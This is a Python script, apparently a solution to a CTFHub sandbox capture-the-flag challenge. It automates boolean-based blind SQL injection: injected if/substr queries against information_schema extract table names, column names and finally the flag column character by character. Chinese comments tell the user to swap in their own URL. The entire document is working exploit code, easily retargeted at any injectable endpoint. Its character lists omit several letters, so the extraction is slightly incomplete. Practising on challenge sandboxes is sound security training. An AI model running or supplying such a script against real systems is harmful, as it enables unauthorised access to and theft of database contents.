import requests

url = 'http://challenge-141bd592bf1e6fd8.sandbox.ctfhub.com:10800/'  # 更新为你的 URL
lists = 'query_success'

def get_tables(url):
    name = ''
    number = 0
    while True:
        urls = url + f'?id=if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={number},1,0)'
        r = requests.get(urls)
        if lists in r.text:
            break
        number += 1
        print(number)
    for i in range(number + 1):
        for j in 'abcdefghijklmnopqrstuv0123456789_,':
            urls = url + f'?id=if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1)="{j}",1,0)'
            r = requests.get(urls)
            if lists in r.text:
                name += j
                print(name)
    return name.split(',')

def get_column(tablename, url):
    name = ''
    number = 0
    while True:
        urls = url + f'?id=if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="{tablename}"))={number},1,0)'
        r = requests.get(urls)
        if lists in r.text:
            break
        number += 1
        print(number)
    for i in range(number + 1):
        for j in 'abcdefghijklmnopqrstuv0123456789_,':
            urls = url + f'?id=if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="{tablename}"),{i},1)="{j}",1,0)'
            r = requests.get(urls)
            if lists in r.text:
                name += j
                print(name)
    return name.split(',')

def get_flag(columnname, tablename, url):
    flag = ''
    number = 0
    while True:
        for j in '{abcdefghijklmnopqrstuvABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,}':
            urls = url + f'?id=if(substr((select group_concat({columnname}) from {tablename}),{number},1)="{j}",1,0)'
            r = requests.get(urls)
            if lists in r.text:
                flag += j
                print('找到flag后自己按ctrl+c:' + flag)
                break
        number += 1

# tablename = get_tables(url)
# print("Tables:", tablename)
# columnname = get_column('flag', url) 
# print("Columns:", columnname)
# get_flag('flag', 'flag', url) 
'''改成二分查找更快,但我懒得改了'''